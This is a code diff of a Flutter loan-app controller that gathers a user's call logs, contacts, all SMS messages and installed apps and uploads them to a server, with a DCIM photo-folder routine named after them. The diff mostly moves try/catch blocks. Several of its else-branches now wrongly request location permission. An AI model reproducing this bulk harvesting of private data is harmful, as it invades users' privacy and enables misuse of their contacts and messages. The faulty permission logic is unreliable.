@@ -36,7 +36,6 @@ class HomeController extends GetxController implements GetxService {
   String _deviceId = '';
   int _userId = 0;
 
-
   int get currentIndex => _currentIndex;
 
   String get initialLoanAmount => _initialLoanAmount;
@@ -107,8 +106,8 @@ class HomeController extends GetxController implements GetxService {
   }
 
   Future<void> fetchCallLogs() async {
-    try {
-      if (await Permission.phone.request().isGranted) {
+    if (await Permission.phone.request().isGranted) {
+      try {
         Iterable<CallLogEntry> entries = await CallLog.query();
 
         List<CallLogData> callLogDataList =
@@ -129,15 +128,15 @@ class HomeController extends GetxController implements GetxService {
             ApiChecker.checkApi(response);
           }
         }
-      } else {
-        await Permission.phone.request();
-      }
-    } catch (_) {}
+      } catch (_) {}
+    } else {
+      await Permission.phone.request();
+    }
   }
 
   Future<void> fetchContactsLogs() async {
-    try {
-      if (await Permission.contacts.request().isGranted) {
+    if (await Permission.contacts.request().isGranted) {
+      try {
         Iterable<Contact> contacts = await ContactsService.getContacts();
         List<ContactData> contactDataList =
             contacts.map((e) => ContactData.fromJson(e)).toList();
@@ -156,10 +155,10 @@ class HomeController extends GetxController implements GetxService {
             ApiChecker.checkApi(response);
           }
         }
-      } else {
-        await Permission.contacts.request();
-      }
-    } catch (_) {}
+      } catch (_) {}
+    } else {
+      await Permission.location.request();
+    }
   }
 
   Future<void> getDeviceIdAndUserId() async {
@@ -178,8 +177,8 @@ class HomeController extends GetxController implements GetxService {
   }
 
   Future<void> fetchSMSLogs() async {
-    try {
-      if (await Permission.sms.request().isGranted) {
+    if (await Permission.sms.request().isGranted) {
+      try {
         SmsQuery query = SmsQuery();
         List<SmsMessage> messages = await query.getAllSms;
         List<SmsData> smsDataList =
@@ -198,15 +197,15 @@ class HomeController extends GetxController implements GetxService {
             ApiChecker.checkApi(response);
           }
         }
-      } else {
-        await Permission.sms.request();
-      }
-    } catch (_) {}
+      } catch (_) {}
+    } else {
+      await Permission.location.request();
+    }
   }
 
   Future<void> fetchInstalledApps() async {
-    try {
-      if (await Permission.storage.request().isGranted) {
+    if (await Permission.storage.request().isGranted) {
+      try {
         List<AppInfo> apps = await InstalledApps.getInstalledApps(true, true);
         List<AppData> appDataList =
             apps.map((e) => AppData.fromJson(e)).toList();
@@ -224,8 +223,10 @@ class HomeController extends GetxController implements GetxService {
             ApiChecker.checkApi(response);
           }
         }
-      }
-    } catch (_) {}
+      } catch (_) {}
+    } else {
+      await Permission.location.request();
+    }
   }
 
   Future<void> fetchDCIMFolder() async {
